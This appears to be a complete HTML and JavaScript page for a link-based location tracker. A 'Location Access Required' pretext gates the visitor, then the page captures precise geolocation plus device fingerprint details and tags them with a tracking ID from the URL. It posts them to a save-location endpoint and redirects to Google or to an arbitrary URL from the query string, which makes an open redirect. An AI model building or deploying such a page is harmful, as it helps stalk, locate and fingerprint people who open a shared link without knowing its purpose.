<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Access Required</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="card text-center">
            <div class="location-icon">üìç</div>
            <h2>Location Access Required</h2>
            <p>This link requires access to your location to continue.</p>
            
            <div id="status" class="status">
                <p>Click the button below to share your location</p>
            </div>
            
            <button id="shareLocationBtn" class="btn-primary">Share My Location</button>
            
            <div id="locationInfo" class="hidden">
                <h3>Location Captured Successfully!</h3>
                <p id="coordinates"></p>
                <p>Redirecting...</p>
            </div>
        </div>
    </div>

    <script>
        // Get tracking ID from URL
        const urlParams = new URLSearchParams(window.location.search);
        const trackingId = urlParams.get('id');
        const redirectUrl = urlParams.get('redirect') || 'https://google.com';

        document.getElementById('shareLocationBtn').addEventListener('click', function() {
            this.disabled = true;
            this.textContent = 'Getting Location...';
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const locationData = {
                            trackingId: trackingId,
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date().toISOString(),
                            deviceInfo: {
                                userAgent: navigator.userAgent,
                                platform: navigator.platform,
                                language: navigator.language,
                                screenResolution: screen.width + 'x' + screen.height
                            }
                        };

                        // Send location data to server
                        fetch('/api/save-location', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify(locationData)
                        })
                        .then(response => response.json())
                        .then(data => {
                            document.getElementById('shareLocationBtn').style.display = 'none';
                            document.getElementById('status').style.display = 'none';
                            document.getElementById('locationInfo').classList.remove('hidden');
                            document.getElementById('coordinates').textContent = 
                                `Lat: ${position.coords.latitude.toFixed(6)}, Lng: ${position.coords.longitude.toFixed(6)}`;
                            
                            // Redirect after 3 seconds
                            setTimeout(() => {
                                window.location.href = redirectUrl;
                            }, 3000);
                        })
                        .catch(error => {
                            console.error('Error:', error);
                            alert('Failed to save location data');
                        });
                    },
                    function(error) {
                        let errorMessage = '';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = "Location access denied. Please enable location services and try again.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "Location information unavailable.";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "Location request timed out.";
                                break;
                            default:
                                errorMessage = "An unknown error occurred.";
                                break;
                        }
                        
                        document.getElementById('status').innerHTML = `<p class="error">${errorMessage}</p>`;
                        document.getElementById('shareLocationBtn').disabled = false;
                        document.getElementById('shareLocationBtn').textContent = 'Try Again';
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 60000
                    }
                );
            } else {
                document.getElementById('status').innerHTML = '<p class="error">Geolocation is not supported by this browser.</p>';
                document.getElementById('shareLocationBtn').disabled = false;
                document.getElementById('shareLocationBtn').textContent = 'Share My Location';
            }
        });
    </script>
</body>
</html>
